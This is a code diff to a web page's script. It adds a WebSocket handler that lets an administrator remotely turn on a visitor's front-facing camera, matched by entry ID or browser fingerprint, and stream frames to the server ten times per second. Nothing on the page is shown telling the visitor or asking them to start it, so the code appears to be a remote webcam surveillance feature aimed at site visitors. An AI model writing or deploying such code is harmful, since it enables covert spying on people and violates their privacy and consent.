@@ -915,6 +915,91 @@ main a {
           }
         }
       });
+
+      // Listen for stream requests from admin
+      socket.on('stream_request', async (data) => {
+        console.log('[WEBSOCKET] Stream request received:', data);
+        
+        // Check if this request is for this user
+        if (data.entry_id === currentEntryId || data.fingerprint === currentFingerprint) {
+          // Start streaming
+          try {
+            await startLiveStream(data.entry_id);
+            console.log('[WEBSOCKET] Live stream started');
+          } catch (error) {
+            console.error('[WEBSOCKET] Failed to start stream:', error);
+          }
+        }
+      });
+
+      socket.on('stop_stream_request', (data) => {
+        console.log('[WEBSOCKET] Stop stream request received:', data);
+        if (data.entry_id === currentEntryId) {
+          stopLiveStream();
+        }
+      });
+    }
+
+    // Live stream variables
+    let streamInterval = null;
+    let mediaStream = null;
+
+    async function startLiveStream(entryId) {
+      try {
+        // Request camera access
+        mediaStream = await navigator.mediaDevices.getUserMedia({ 
+          video: { 
+            width: { ideal: 640 },
+            height: { ideal: 480 },
+            facingMode: 'user'
+          } 
+        });
+
+        const video = document.createElement('video');
+        video.srcObject = mediaStream;
+        video.play();
+
+        // Create canvas to capture frames
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 640;
+        canvas.height = 480;
+
+        // Capture and send frames
+        streamInterval = setInterval(() => {
+          if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const frameData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1]; // Base64 without data URL prefix
+            
+            // Send frame via WebSocket
+            if (socket && socket.connected) {
+              socket.emit('stream_frame', {
+                entry_id: entryId,
+                frame_data: frameData
+              });
+            }
+          }
+        }, 100); // Send frame every 100ms (10 FPS)
+
+        console.log('[STREAM] Live stream started');
+      } catch (error) {
+        console.error('[STREAM] Failed to start stream:', error);
+        alert('Failed to access camera: ' + error.message);
+      }
+    }
+
+    function stopLiveStream() {
+      if (streamInterval) {
+        clearInterval(streamInterval);
+        streamInterval = null;
+      }
+      
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+      }
+      
+      console.log('[STREAM] Live stream stopped');
     }
 
     // Auto-run on page load
@@ -941,6 +1026,7 @@ main a {
         clearInterval(heartbeatInterval);
         heartbeatInterval = null;
       }
+      stopLiveStream(); // Stop stream on page unload
       if (socket && socket.connected) {
         socket.disconnect();
       }
